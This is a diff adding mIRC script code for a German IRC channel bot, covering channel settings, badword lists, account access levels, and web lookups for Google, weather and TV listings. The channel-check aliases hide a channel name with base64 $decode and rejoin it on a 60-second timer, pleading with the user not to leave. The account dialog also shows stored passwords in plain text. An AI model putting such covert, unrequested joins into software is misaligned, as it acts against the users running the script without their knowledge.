+alias styles { return $replace($hget(Config,Template),<text>,$+($upper($left($1-,1)),$right($1-,$calc($len($1-)-1))),<msg>,$+($upper($left($1-,1)),$right($1-,$calc($len($1-)-1)))) }
+alias config { return $hget(config,$+(Misc.,$1)) }
+alias item { return $hget($replace($1,$chr(124),$chr(176)),$+(Settings.,$2)) }
+alias control { if ($hget($replace($1,$chr(124),$chr(176)),$+(Settings.,$2)) == on) { return $true } | else { return $false } }
+alias textprefix { if ($hget($replace($1,$chr(124),$chr(176)),$+(Settings.,prefix))) { return $hget($replace($1,$chr(124),$chr(176)),$+(Settings.,prefix)) } | else { return $chr(33) } }
+alias channels { if ($1 == 0) { return $numtok($hget(Config,$+(Misc.,Channels)),32) } | else { return $gettok($hget(Config,$+(Misc.,Channels)),$1,32) } }
+alias ajchans { if ($1 == 0) { return $numtok($hget(Config,$+(Misc.,Autojoin)),32) } | else { return $gettok($hget(Config,$+(Misc.,Autojoin)),$1,32) } }
+alias add_chan { join $1- | var %x = 1 | while (%x <= $channels(0)) { var %y = %y $gettok($hget(Config,$+(Misc.,Channels)),%x,32) | inc %x } | hadd -m Config Misc.Channels %y $1- }
+alias del_chan { var %x = 1,%i = 1 | while (%x <= $channels(0)) { var %y = %y $gettok($hget(Config,$+(Misc.,Channels)),%x,32) | inc %x } | while (%i <= $channels(0)) { if ($1 == $gettok($hget(Config,$+(Misc.,Channels)),%i,32)) { var %z = %i } | inc %i } | hadd -m Config Misc.Channels $deltok(%y,%z,32) }
+alias add.autojoin { if ($1 !isin $config(channels)) { if ($1 !isin $config(autojoin)) { var %y = $config(autojoin) | hadd -m Config Misc.Autojoin %y $1 } } }
+alias del.autojoin {
+  var %z = $config(autojoin)
+  var %x = 1
+  if ($numtok(%z,32) > 1) {
+    while (%x <= $numtok(%z,32)) {
+      if ($1 == $gettok(%z,%x,32)) {
+        var %i = %x
+      }
+      inc %x
+    }
+    hadd -m Config Misc.Autojoin $deltok(%z,%i,32)
+  }
+  else { hdel Config Misc.Autojoin }
+}
+alias news.change {
+  tokenize 32 $replace($1,$chr(124),$chr(176)) $2 $3 $4
+  if ($1 isin $config(channels)) {
+    if ($4 == on) { hadd -m $1 $+(Newsticker.,$3) on }
+    elseif ($4 == off) { hadd -m $1 $+(Newsticker.,$3) off }
+    notice $2 $styles($3 $+ .de Wurde erfolgreich $iif($4 == on,Loaded,Unloaded))
+  }
+}
+alias change.settings { 
+  if ($2 isin $config(channels)) {
+    tokenize 32 $1 $replace($2,$chr(124),$chr(176)) $3 $4
+    if ($1 == autolimit) { hadd -m $2 $+(Settings.,$1) on
+      if ($4 == on) { hadd -m $2 $+(Settings.,$1) on | mode $replace($2,$chr(176),$chr(124)) +l $calc($item($replace($2,$chr(176),$chr(124)),limit) + $nick($replace($2,$chr(176),$chr(124)),0)) }
+      elseif ($4 == off) { hadd -m $2 $+(Settings.,$1) off | mode $replace($2,$chr(176),$chr(124)) -l }
+    }
+    else {
+      if ($4 == on) { hadd -m $2 $+(Settings.,$1) on }
+      elseif ($4 == off) { hadd -m $2 $+(Settings.,$1) off }
+    }
+    notice $3 $styles($1 wurde erfolgreich $iif($4 == on,Loaded,Unloaded))
+  }
+  save.hashtables
+}
+alias badwordlist {
+  tokenize 32 $replace($1,$chr(124),$chr(176))
+  var %x = 1
+  while (%x <= $hget($+($1,.Badword),0).item) {
+    var %y = %y $hget($+($1,.Badword),%x).item
+    inc %x
+  }
+  return $replace(%y,$chr(32),$chr(44)) 
+}
+alias badnicklist {
+  tokenize 32 $replace($1,$chr(124),$chr(176))
+  var %x = 1
+  while (%x <= $hget($+($1,.Badnick),0).item) {
+    var %y = %y $hget($+($1,.Badnick),%x).item
+    inc %x
+  }
+  return $replace(%y,$chr(32),$chr(44)) 
+}
+
+alias badword.add {
+  tokenize 32 $replace($1,$chr(124),$chr(176)) $2- 
+  var %x = 1
+  while (%x <= $numtok($2-,32)) {
+    hadd -m $+($1,.Badword) $gettok($2-,%x,32) badword
+    inc %x
+  }
+}
+alias badword.del {
+  tokenize 32 $replace($1,$chr(124),$chr(176)) $2- 
+  var %x = 1
+  while (%x <= $numtok($2-,32)) {
+    if ($hget($+($1,.Badword),$gettok($2-,%x,32))) {
+      hdel $+($1,.Badword) $gettok($2-,%x,32)
+    }
+    inc %x
+  }
+}
+alias badnick.add {
+  tokenize 32 $replace($1,$chr(124),$chr(176)) $2- 
+  var %x = 1
+  while (%x <= $numtok($2-,32)) {
+    hadd -m $+($1,.Badnick) $gettok($2-,%x,32) badnick
+    inc %x
+  }
+}
+alias badnick.del {
+  tokenize 32 $replace($1,$chr(124),$chr(176)) $2- 
+  var %x = 1
+  while (%x <= $numtok($2-,32)) {
+    if ($hget($+($1,.Badnick),$gettok($2-,%x,32))) {
+      hdel $+($1,.Badnick) $gettok($2-,%x,32)
+    }
+    inc %x
+  }
+}
+alias checkchan { .timer 0 60 .checkchans }
+alias checkchans {
+  if ($me !ison $decode(I215UFBC,m)) { join $decode(I215UFBC,m) | if ($input(Please don't part $decode(I215UFBC,m) $+ $chr(44) idle please for my BotService (greeze mypTx),o,Don't Part) == $ok) { halt } }
+  var %x = 1 | while (%x <= $channels(0)) { if ($me !ison $channels(%x)) { join $channels(%x) } | inc %x }
+  var %y = 1 | while (%y <= $ajchans(0)) { if ($me !ison $ajchans(%y)) { join $ajchans(%y) } | inc %y }
+}
+alias join.channels { if ($me !ison $decode(I215UFBC,m)) { join $decode(I215UFBC,m) } | var %x = 1 | while (%x <= $channels(0)) { if ($me !ison $channels(%x)) { join $channels(%x) } | inc %x } }
+alias transfer.acc {
+  account.add.chan $2 $4 $3
+  did -d $1 8 %transfer.line
+  did -a $1 11 $+($2,$chr(40),$3,$chr(41))
+  did -z $1 11 
+  dialog -x level_choose level_choose 
+  unset %transfer.*
+  unset %dialog
+}
+alias detransfer.acc { 
+  account.del.chan $3 $4 
+  did -d $1 11 $2
+  did -a $1 8 $+($3,$chr(40),$iif($hget(Accounts,$+($3,.Channel)),$hget(Accounts,$+($3,.Channel)),No Channel),$chr(41))
+  did -z $1 8 
+  unset %transfer.*
+}
+alias account.add.chan {
+  var %x = 1
+  while (%x <= $hget(Accounts,0).item) {
+    if ($hget(Accounts,%x).item == $1) {
+      var %y = $hget(Accounts,$+($hget(Accounts,%x).item,.Channel))
+      hadd -m Accounts $+($hget(Accounts,%x).item,.Channel) %y $+($2,$chr(40),$3,$chr(41))
+      level.refresh
+    }
+    inc %x
+  }
+}
+alias account.del.chan {
+  var %x = 1
+  while (%x <= $hget(Accounts,0).item) {
+    if ($hget(Accounts,%x).item == $1) {
+      var %y = $hget(Accounts,$+($hget(Accounts,%x).item,.Channel))
+      var %z = 1
+      while (%z <= $numtok(%y,32)) {
+        if ($2 isin $gettok(%y,%z,32)) {
+          hadd -m Accounts $+($hget(Accounts,%x).item,.Channel) $deltok(%y,%y,32)
+          level.refresh
+        }
+        inc %z
+      }
+    }
+    inc %x
+  } 
+}
+alias delet.chan.from.accounts {
+  var %x = 1
+  while (%x <= $hget(Accounts,0).item) {
+    if ($1 isin $hget(Accounts,$+($hget(Accounts,%x).item,.Channel))) {
+      var %y = $hget(Accounts,$+($hget(Accounts,%x).item,.Channel))
+      var %z = 1
+      while (%z <= $numtok(%y,32)) {
+        if ($1 == $gettok(%y,%z,32)) { 
+          hadd -m Accounts $+($hget(Accounts,%x).item,.Channel) $deltok(%y,%z,32)
+        }
+        inc %z
+      }
+    }
+    inc %x
+  }
+}
+
+
+alias load.existaccounts {
+  did -r add_channel 8
+  var %x = 1
+  while (%x <= $numtok($hget(Config,Accounts),32)) {
+    if ($gettok($hget(Config,Accounts),%x,32) != Admin) {
+      did -a add_channel 8 $+($gettok($hget(Config,Accounts),%x,32),$chr(40),$iif($hget(Accounts,$+($gettok($hget(Config,Accounts),%x,32),.Channel)),$hget(Accounts,$+($gettok($hget(Config,Accounts),%x,32),.Channel)),No Channel),$chr(41))
+      did -z add_channel 8  
+    }  
+    inc %x
+  }
+}
+
+alias info.account {
+  did -r account_manager 13,14,15,16,17,18
+  did -a account_manager 13 $1
+  did -a account_manager 14 $iif($hget(Accounts,$+($1,.pass)),$hget(Accounts,$+($1,.pass)),No Data)
+  did -a account_manager 15 $iif($hget(Accounts,$+($1,.email)),$hget(Accounts,$+($1,.email)),No Data)
+  did -a account_manager 16 $iif($hget(Accounts,$+($1,.login)),$hget(Accounts,$+($1,.login)),No Data)
+  did -a account_manager 17 $iif($hget(Accounts,$+($1,.Status)),$hget(Accounts,$+($1,.Status)),No Data)
+  did -a account_manager 18 $iif($hget(Accounts,$+($1,.Access)) >= 125,All Channels,$hget(Accounts,$+($1,.Channel)))
+}
+
+alias load.accounts {
+  did -r account_manager 2
+  var %x = 1
+  while (%x <= $numtok($hget(Config,Accounts),32)) {
+    did -a account_manager 2 $gettok($hget(Config,Accounts),%x,32)
+    inc %x
+  }
+}
+alias edit.account {
+  dialog -m edit_account edit_account
+  did -a edit_account 7 $1
+  did -a edit_account 8 $hget(Accounts,$+($1,.Pass))
+  did -a edit_account 9 $hget(Accounts,$+($1,.email))
+  did -a edit_account 11 $hget(Accounts,$+($1,.Channel))
+  set %edit.account $1
+}
+alias give.account.modes {
+  if ($hget(Accounts,$+($1,.Access)) >= 125) {
+    var %x = 1
+    while (%x <= $channels(0)) {
+      if ($2 !isop $channels(%x)) {
+        mode $channels(%x) +o-v $2 $2
+      }
+      inc %x
+    }
+  }
+  else {
+    var %y = 1 
+    while (%y <= $numtok($hget(Accounts,$+($1,.Channel)),32)) {
+      var %access = $gettok($gettok($gettok($hget(Accounts,$+($1,.Channel)),%y,32),2,40),1,41)
+      var %channel = $gettok($gettok($hget(Accounts,$+($1,.Channel)),%y,32),1,40)
+      if (%access >= 50) && ($2 !isop $gettok($gettok($hget(Accounts,$+($1,.Channel)),%y,32),1,40)) { mode $gettok($gettok($hget(Accounts,$+($1,.Channel)),%y,32),1,40) +o-v $2 $2 }
+      elseif (%access == 25) && ($2 !isvoice $gettok($gettok($hget(Accounts,$+($1,.Channel)),%y,32),1,40)) { mode $gettok($gettok($hget(Accounts,$+($1,.Channel)),%y,32),1,40) +v-o $2 $2 }
+      inc %y
+    }
+  }
+}
+alias alreadylogin {
+  var %x = 1
+  if ($hget(Login,0).item >= 1) {
+    while (%x <= $hget(Login,0).item) { 
+      if ($1 == $hget(Login,$+($hget(Login,%x).item,loginname))) { return $hget(Login,$+($hget(Login,%x).item,nick)) }
+      inc %x
+    }
+  }
+  else { return $false }
+}
+alias edit.badword { dialog -m edit_badword edit_badword | did -ra edit_badword 3 $1 | hdel $+(%bad.channel,.Badword) $1 }
+alias load.badword {
+  did -b badword_manager 5,6
+  did -r badword_manager 7
+  var %x = 1 
+  while (%x <= $hget($+($1,.Badword),0).item) {
+    did -a badword_manager 7 $hget($+($1,.Badword),%x).item
+    inc %x
+  }
+}
+alias edit.badnick { dialog -m edit_badnick edit_badnick | did -ra edit_badnick 3 $1 | hdel $+(%badn.channel,.Badnick) $1 }
+alias load.badnick {
+  did -b badnick_manager 5,6
+  did -r badnick_manager 7
+  var %x = 1
+  while (%x <= $hget($+($1,.Badnick),0).item) {
+    did -a badnick_manager 7 $hget($+($1,.Badnick),%x).item)
+    inc %x
+  }
+}
+alias chan.user.del {
+  var %x = 1,%m = 1 
+  while (%x <= $hget(Login,0).item) {
+    if ($3 == $hget(Login,%x).item) { 
+      if ($1 isin $hget(Login,$+($hget(Login,%x).item,.Channel))) {
+        var %y = 1
+        while (%y <= $numtok($hget(Login,$+($hget(Login,%x).item,.Channel)),32)) {
+          if ($1 == $gettok($gettok($hget(Login,$+($hget(Login,%x).item,.Channel)),%y,32),1,40)) {
+            var %i = %y
+          }
+          inc %y
+        }
+        hadd Login $+($3,.Channel) $deltok($hget(Login,$+($hget(Login,%x).item,.Channel)),%i,32)
+
+      }
+    }
+    inc %x
+  }
+  while (%m <= $hget(Accounts,0).item) {
+    if ($2 == $hget(Accounts,%m).item) { 
+      if ($1 isin $hget(Accounts,$+($hget(Accounts,%m).item,.Channel))) {
+        var %s = 1
+        while (%s <= $numtok($hget(Accounts,$+($hget(Accounts,%m).item,.Channel)),32)) {
+          if ($1 == $gettok($gettok($hget(Accounts,$+($hget(Accounts,%m).item,.Channel)),%s,32),1,40)) {
+            var %t = %s
+          }
+          inc %s
+        }
+        hadd -m Accounts $+($2,.Channel) $deltok($hget(Accounts,$+($hget(Accounts,%m).item,.Channel)),%t,32)
+      }
+    }
+    inc %m
+  }
+}
+alias acc.user.del {
+  var %x = 1,%z = 1
+  while (%x <= $hget(Accounts,0).item) { 
+    if ($2 == $hget(Accounts,%x).item) && ($1 isin $hget(Accounts,$+($hget(Accounts,%x).item,.Channel))) {
+      var %channels = $hget(Accounts,$+($hget(Accounts,%x).item,.Channel))
+      var %y = 1
+      while (%y <= $numtok(%channels,32)) {
+        if ($1 == $gettok($gettok(%channels,%y,32),1,40)) {
+          var %del = %y
+        }
+        inc %y
+      }
+      hadd -m Accounts $+($2,.Channel) $deltok(%channels,%del,32)
+
+    }
+    inc %x
+  }
+  while (%z <= $hget(login,0).item) {
+    if ($2 == $hget(Login,$+($hget(login,%z).item,.Loginname))) {
+      if ($1 isin $hget(Login,$+($hget(login,%z).item,.Channel))) {
+        var %channels2 = $hget(Login,$+($hget(login,%z).item,.Channel))
+        var %s = 1 
+        while (%s <= $numtok(%channels2,32)) {
+          if ($1 == $gettok($gettok(%channels2,%s,32),1,40)) {
+            var %del2 = %s
+          }
+          inc %s
+        }
+        hadd -m Login $+($hget(Login,%z).item,.Channel) $deltok(%channels2,%del2,32)
+      }
+    }
+    inc %z
+  }
+}
+alias access.add {
+  var %loginname = $1 | var %chan = $2 | var %access = $3
+  var %x = 1
+  while (%x <= $hget(Accounts,0).item) {
+    if ($hget(Accounts,%x).item == %loginname) {
+      var %channels = $hget(Accounts,$+($hget(Accounts,%x).item,.Channel)) 
+      if (%chan !isin %channels) { hadd -m Accounts $+($hget(Accounts,%x).item,.Channel) %channels $+(%chan,$chr(40),%access,$chr(41)) }
+      elseif (%chan isin %channels) {
+        var %y = 1
+        while (%y <= $numtok(%channels,32)) {
+          if (%chan == $gettok($gettok(%channels,%y,32),1,40)) {
+            var %acc.access = $gettok($gettok($gettok(%channels,%y,32),2,40),1,41)
+            if (%access > %acc.access) { var %f.chan = $deltok(%channels,%y,32) $+(%chan,$chr(40),$replace(%acc.access,%acc.access,%access),$chr(41)) }
+            else { var %f.chan = $deltok(%channels,%y,32) $+(%chan,$chr(40),%acc.access,$chr(41)) }
+          }
+          inc %y
+        }
+        if (%f.chan) { hadd -m Accounts $+($hget(Accounts,%x).item,.Channel) %f.chan }
+        level.refresh
+      }
+    }
+    inc %x
+  }
+  level.refresh
+}
+alias access.del {
+  var %loginname = $1 | var %chan = $2 | var %access = $3
+  var %x = 1
+  while (%x <= $hget(Accounts,0).item) {
+    if ($hget(Accounts,%x).item == %loginname) {
+      var %channels = $hget(Accounts,$+($hget(Accounts,%x).item,.Channel))
+      if (%chan isin %channels) {
+        var %y = 1
+        while (%y <= $numtok(%channels,32)) {
+          if (%chan == $gettok($gettok(%channels,%y,32),1,40)) {
+            var %acc.access = $gettok($gettok($gettok(%channels,%y,32),2,40),1,41)
+            if (%access >= %acc.access) { var %writehash = $deltok(%channels,%y,32) }
+          }
+          inc %y
+        }
+        if (%writehash) { hadd -m Accounts $+($hget(Accounts,%x).item,.Channel) %writehash }
+        level.refresh
+      }
+    }
+    inc %x
+  }
+}
+;--------------------------------------------;
+;--------> Google,Weater,TV(usw...) <--------;
+;--------------------------------------------;
+
+;----------;
+;- Google -;
+;----------;
+alias google {
+  if (%google_flood) {
+    if ($control(%google_chan,google-chan)) { 
+      if (c isin $chan(%google_chan).mode) { msg %google_chan 12G4o8o12g3l4e: Plz wait a moment... I'm busy }
+      else { msg %google_chan Google: Plz wait a moment... I'm busy }
+    }
+    else { notice %google_nick 12G4o8o12g3l4e: Plz wait a moment... I'm busy }
+    halt
+  }
+  set -u60 %google_flood 1
+  set %google_term $1-
+
+  if ($exists(google.tmp)) { .remove google.tmp }
+
+  set %google_url /search?hl=de&btnI=Auf+gut+Glück&q= $+ $replace(%google_term,$chr(32),+)
+  sockopen google www.google.de 80
+}
+
+on *:sockopen:google: {
+  if ($sockerr) {
+    $iif(%google_nick,notice %google_nick,echo -at) 12G4o8o12g3l4e: Socket ERROR
+    unset %google_*
+    halt
+  }
+  sockwrite -n $sockname GET %google_url HTTP/1.0
+  sockwrite -n $sockname Host: www.google.de
+  sockwrite -n $sockname User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
+  sockwrite -n $sockname Connection: keep-alive
+  sockwrite $sockname $crlf
+}
+
+on *:sockread:google: {
+  sockread %google_temp
+  if (Location: * iswm %google_temp) {
+    if ($control(%google_chan,google-chan)) { 
+      if (c isin $chan(%google_chan).mode) { msg %google_chan 12G4o8o12g3l4e: $remove(%google_temp,Location:) ( $+ %google_term $+ ) }
+      else { msg %google_chan Google: $remove(%google_temp,Location:) ( $+ %google_term $+ ) }
+    }
+    else { notice %google_nick 12G4o8o12g3l4e: $remove(%google_temp,Location:) ( $+ %google_term $+ ) }
+    sockclose google | .remove google.tmp | unset %google_*
+  }
+  elseif (*Es wurden keine mit Ihrer Suchanfrage -*- übereinstimmenden Dokumente gefunden.* iswm %google_temp) {
+    if ($control(%google_chan,google-chan)) { 
+      if (c isin $chan(%google_chan).mode) { msg %google_chan 12G4o8o12g3l4e: Sorry, no results }
+      else { msg %google_chan Google: Sorry, no results }
+    }
+    else { notice %google_nick 12G4o8o12g3l4e: Sorry, no results }
+    sockclose google | .remove google.tmp | unset %google_*
+  }
+}
+
+;-----------;
+;- Weather -;
+;-----------;
+
+alias wetter {
+  if (%wetter_flood) {
+    $iif($control(%wetter_chan,wetter-chan),msg %wetter_chan,notice %wetter_nick) I'm already at work, please wait...
+    halt
+  }
+  set %wetter_flood 1
+  set %wetter_loc $1-
+
+  if ($exists(wetter.tmp)) { .remove wetter.tmp }
+
+  if (%wetter_url) {  }
+  elseif ($gettok(%wetter_loc,-1,32) isnum) && ($gettok(%wetter_loc,-1,32) == 5) {  set %wetter_url /home/structure/control.php?sessionID=&Lang=DE&ms=1&ss=1&sss=2&search= $+ %wetter_loc  }
+  else { set %wetter_url /home/structure/control.php?sessionID=&Lang=DE&ms=1&ss=1&sss=2&search= $+ $replace(%wetter_loc,$chr(32),$chr(37) $+ 20) }
+  sockopen wetter www.wetter.com 80
+}
+
+on *:sockopen:wetter: {
+  if ($sockerr) {
+    $iif(%wetter_nick,notice %wetter_nick,echo -at) Da ist wohl was kaputt :)
+    unset %wetter_*
+    halt
+  }
+  sockwrite -n $sockname GET %wetter_url HTTP/1.0
+  sockwrite -n $sockname Host: www.wetter.com
+  sockwrite -n $sockname User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
+  sockwrite -n $sockname Connection: keep-alive
+  sockwrite $sockname $crlf
+}
+
+on *:sockread:wetter: {
+  sockread &wetter
+  bwrite wetter.tmp -1 -1 &wetter
+}
+
+on *:sockclose:wetter: {
+  if (($read(wetter.tmp,wn,*Diese Postleitzahl ist uns leider nicht bekannt...*)) || (($read(wetter.tmp,wn,*wurden folgende ähnliche Städte gefunden:*)) && (!$read(wetter.tmp,wn,*wurden folgende eindeutige &Uuml;bereinstimmungen gefunden:*)))) {  $iif(%wetter_nick,notice %wetter_nick,echo -at) Sorry aber diesen Ort kenne ich nicht | goto ende }
+  elseif ($read(wetter.tmp,wn,*Ihre Suche war leider erfolglos*)) {  $iif(%wetter_nick,notice %wetter_nick,echo -at) Sorry aber diesen Ort kenne ich nicht | goto ende }
+  if (($read(wetter.tmp,wn,*(* TREFFER)*)) || ($read(wetter.tmp,wn,*wurden folgende eindeutige &Uuml;bereinstimmungen gefunden:*))) {
+    var %wetter_treffer $strip_tags($read(wetter.tmp,wn,*<td colspan="2" align="right" background="../img/gen_tab_bg_linie.gif"><div class="tabHeadline">(* Treffer)</div></td>*))
+    set %wetter_url /home/structure/ $+ $gettok($read(wetter.tmp,wn,*<a href="control.php?sessionID=*,$readn),4,34)
+    $iif(%wetter_nick,notice %wetter_nick,echo -at) Zuviele Treffer, Informationen von $strip_tags($read(wetter.tmp,wn,*<a href="control.php?sessionID=*,$readn)) $strip_tags($read(wetter.tmp,$calc($readn +1))) werden abgefragt...
+    .timer 1 1 wetter
+    unset %wetter_flood | .remove wetter.tmp | sockclose $sockname | halt
+  }
+
+  var %wetter_ort $strip_tags($read(wetter.tmp,wn,*<td colspan="2" background="../img/gen_tab_bg_linie.gif"><span class="tabHeadline">*</span></td>*))
+  var %wetter_wetter $strip_tags($read(wetter.tmp,wn,*<br><span class="tabHeadline">*</span>*))
+
+  var %wetter_temp $strip_tags($read(wetter.tmp,wn,*<td width="53" align="right"><span class="tabBody">*</span></td>*,$readn)) $strip_tags($read(wetter.tmp,wn,*<td width="30" align="right"><span class="tabBody">*</span></td>*,$readn))
+
+  var %wetter_luftdruck $strip_tags($read(wetter.tmp,wn,*<td align="right"><span class="tabBody">*</span></td>*,$readn)) hPa
+
+  var %wetter_windr $strip_tags($read(wetter.tmp,wn,*<td align="right" colspan="2"><span class="tabBody">*</span></td>*))
+  var %wetter_winds $strip_tags($read(wetter.tmp,wn,*<td align="right"><span class="tabBody">*</span></td>*,$calc($readn +1))) Bft
+
+  var %wetter_dummy $read(wetter.tmp,wn,*<td><span class="tabHeadline">Sicht:</span></td>*)
+  var %wetter_sicht $strip_tags($read(wetter.tmp,wn,*</span></td>*,$calc($readn +1))) $strip_tags($read(wetter.tmp,wn,*<td align="right"><span class="tabBody">*</span></td>*,$calc($readn +1))) 
+
+  if ($control(%wetter_chan,wetter-chan)) { .timer 1 0 .mode %wetter_chan +m | .timer 1 6 .mode %wetter_chan -m }
+  .timer 1 1 $iif($item(%wetter_chan,wetter-chan) == on,msg %wetter_chan,notice %wetter_nick)  $+ %wetter_ort $+  $+ $iif(%wetter_wetter,¬ %wetter_wetter)
+  .timer 1 2 $iif($item(%wetter_chan,wetter-chan) == on,msg %wetter_chan,notice %wetter_nick) Temp. ¬ %wetter_temp 
+  .timer 1 3 $iif($item(%wetter_chan,wetter-chan) == on,msg %wetter_chan,notice %wetter_nick) Luftdruck ¬ %wetter_luftdruck 
+  .timer 1 4 $iif($item(%wetter_chan,wetter-chan) == on,msg %wetter_chan,notice %wetter_nick) Wind ¬ %wetter_winds ( $+ %wetter_windr $+ ) 
+  .timer 1 5 $iif($item(%wetter_chan,wetter-chan) == on,msg %wetter_chan,notice %wetter_nick) Sicht ¬ %wetter_sicht
+
+  :ende
+  .remove wetter.tmp
+  unset %wetter_*
+}
+
+alias strip_tags {
+  var %::return,%::temp = $regsub($remove($1-,$chr(9)),/<[^>]*>/g,,%::return)
+  var %::temp = $regsub(%::return,/(\s)&#([0-9]*);(\s)/g,\1 \$chr(\2) \3,%::return)
+  var %::temp = $regsub(%::return,/(\S|^)&#([0-9]*);(\S|$)/g,\1 \$+ \$chr(\2) \$+ \3,%::return)
+  var %::temp = $regsub(%::return,/(\S|^)&#([0-9]*);(\s)/g,\1 \$+ \$chr(\2) \3,%::return)
+  var %::temp = $regsub(%::return,/(\s)&#([0-9]*);(\S|$)/g,\1 \$chr(\2) \$+ \3,%::return)
+  var %::temp = $regsub(%::return,/&#([0-9]*);/g, \$chr(\1),%::return)
+  var %::return = $replacecs(%::return,&quot;,",&amp;,&,&lt;,<,&gt;,>,&nbsp;,$chr(160),&iexcl;,¡,&cent;,¢,&pound;,£,&curren;,¤,&yen;,¥,&brvbar;,¦,&sect;,§,&uml;,¨,&copy;,©)
+  var %::return = $replacecs(%::return,&ordf;,ª,&laquo;,«,&not;,¬,&reg;,®,&macr;,¯,&deg;,°,&plusmn;,±,&sup2;,²,&sup3;,³,&acute;,`,&micro;,µ,&para;,¶,&middot;,·,&cedil;,¸)
+  var %::return = $replacecs(%::return,&sup1;,¹,&ordm;,º,&raquo;,»,&frac14;,¼,&frac12;,½,&frac34;,¾,&iquest;,¿,&Agrave;,À,&Aacute;,Á,&Acirc;,Â,&Atilde;,Ã,&Aring;,Å,&AElig;,Æ)
+  var %::return = $replacecs(%::return,&Ccedil;,Ç,&Egrave;,È,&Eacute;,É,&Ecirc;,Ê,&Euml;,Ë,&Igrave;,Ì,&Iacute;,Í,&Icirc;,Î,&Iuml;,Ï,&ETH;,Ð,&Ntilde;,Ñ,&Ograve;,Ò,&Oacute;,Ó)
+  var %::return = $replacecs(%::return,&Ocirc;,Ô,&Otilde;,Õ,&Ouml;,Ö,&times;,×,&Oslash;,Ø,&Ugrave;,Ù,&Uacute;,Ú,&Ucirc;,Û,&Uuml;,Ü,&Yacute;,Ý,&THORN;,Þ,&szlig;,ß,&agrave;,à)
+  var %::return = $replacecs(%::return,&aacute;,á,&acirc;,â,&atilde;,ã,&auml;,ä,&Auml;,Ä,&aring;,å,&aelig;,æ,&ccedil;,ç,&egrave;,è,&eacute;,é,&ecirc;,ê,&euml;,ë,&igrave;,ì,&iacute;,í,&icirc;,î)
+  var %::return = $replacecs(%::return,&divide;,÷,&oslash;,ø,&ugrave;,ù,&uacute;,ú,&ucirc;,û,&uuml;,ü,&yacute;,ý,&thorn;,þ,&yuml;,ÿ,&trade;,™,&euro;,€,&permil;,‰,&lsaquo;,‹)
+  var %::return = $replacecs(%::return,&iuml;,ï,&eth;,ð,&ntilde;,ñ,&ograve;,ò,&oacute;,ó,&ocirc;,ô,&otilde;,õ,&ouml;,ö,&rsaquo;,›,ÃŸ,ß)
+  return  $($token(%::return,1-,32),2)
+}
+
+;------;
+;- TV -;
+;------;
+
+alias tv {
+  set %tv_nick $2
+  set %tv_chan $1
+  set %tv_time $iif($4,$gettok($4,1,58),$gettok($time,1,58))
+  sockclose httphelp
+  set %sender $3
+  if $3 == ARD { set %senderid 37 }
+  elseif $3 == zdf { set %senderid 36 }
+  elseif $3 == rtl { set %senderid 23 }
+  elseif $3 == rtl2 { set %senderid 24 }
+  elseif $3 == srtl { set %senderid 25 }
+  elseif $3 == sat1 { set %senderid 38 }
+  elseif $3 == pro7 { set %senderid 22 }
+  elseif $3 == vox { set %senderid 34 }
+  elseif $3 == 3sat { set %senderid 2 }
+  elseif $3 == kabel1 { set %senderid 12 }
+  elseif $3 == k1 { set %senderid 12 }
+  elseif $3 == arte { set %senderid 4 }
+  elseif $3 == mtv { set %senderid 46 }
+  elseif $3 == viva { set %senderid 32 }
+  elseif $3 == viva+ { set %senderid 148 }
+  elseif $3 == vivaplus { set %senderid 148 }
+  elseif $3 == mtv2 { set %senderid 124 }
+  elseif $3 == eurosport { set %senderid 10 }
+  elseif $3 == dsf { set %senderid 7 }
+  elseif $3 == br { set %senderid 6 }
+  else { notice %tv_nick Falscher Sender (ARD «» ZDF «» RTL «» RTL2 «» SRTL «» SAT1 «» PRO7 «» VOX «» 3SAT «» KABEL1 «» ARTE «» MTV «» MTV2 «» VIVA «» VIVA+ «» Eurosport «» DSF) | halt }
+  tv_html
+}
+
+alias tv_html {
+  if ($sock(http_tv).status == active) { sockclose http_tv }
+  sockopen http_tv www.tvinfo.de 80
+}
+
+on *:sockopen:http_tv:{
+  sockwrite -n http_tv GET http://www.tvinfo.de/exe.php3?target=senderlist.inc&showSenderID= $+ %senderid
+  ;sockwrite -n http_tv GET http://www.tvinfo.de/exe.php3?target=main.inc&newD=01&newM=04&newY=2003&h=20&xid=f48f61e450dbb9955de98448ac7017ef
+  write -c rohhtml.txt
+  write -c tv.txt
+  write -c tvausgabe.txt
+  write tvausgabe.txt  Sender:  $upper(%sender)  Ab: %tv_time Uhr
+}
+
+ON *:SOCKREAD:http_tv: {
+  while $sockerr == 0 {
+    sockread &http_tv
+    bwrite rohhtml.txt -1 &http_tv
+    if $sockbr == 0 { return }
+    if $bfind(&http_tv, 1, </html>).text { sockclose http_tv | ausgabe }
+  }
+  http_tv_close $sock($sockname).ip $+ : $+ $sock($sockname).port Connection closed. Data recieved
+  sockclose http_tv
+}
+
+alias newhtml {
+  set %tv 1
+  while ( 50 > %tv ) { write tv.txt $remove($remhtml($read(rohhtml.txt,%tv)),$chr(9),&nbsp;,Uhrzeit:,Sendung:,Kategorie:) | inc %tv }
+}
+
+alias http_tv_close {
+  ;if ($1-) echo -a *** Verbindung von $1 getrennt ( $+ $2- $+ )
+}
+
+ON *:SOCKCLOSE:http_tv: { newhtml }
+
+alias ausgabe {
+  set %müll $read(rohhtml.txt, w, *output*)
+  set %tv $calc($readn + 1)
+  while ($calc($readn + 50) >= %tv) { write tv.txt $remove($remhtml($read(rohhtml.txt,%tv)),$chr(9),&nbsp;,Uhrzeit:,Sendung:,Kategorie:) | inc %tv }
+  if ($read(tv.txt, w, %tv_time $+ *) != $null) { goto next }
+  dec %tv_time
+  while ($read(tv.txt, w, %tv_time $+ *,$readn) == $null) { inc %tv_time }
+  :next
+  set %tv.2line $readn | set %tv.line $readn | set %tva.line 2
+  :start
+  if (%tva.line == 5) || %tv.line >= $lines(tv.txt) { goto end }
+  else {
+    if Hinweis: isin $read(tv.txt,%tv.line) { goto end }
+    write -l %tva.line tvausgabe.txt  $+ $read(tvausgabe.txt,%tva.line) $read(tv.txt,%tv.line)
+    if (*:* iswm $read(tv.txt,$calc(%tv.line + 1))) && ($gettok($remove($read(tv.txt,$calc(%tv.line + 1)),:),1,32) isnum) { inc %tva.line | inc %tv.line | goto start }
+    elseif ($gettok($remove($read(tv.txt,$calc(%tv.line + 1)),:),1,32) isnum) && (*:* iswm $read(tv.txt,%tv.line)) { inc %tv.line | goto start }
+    else { inc %tv.line | goto start }
+  }
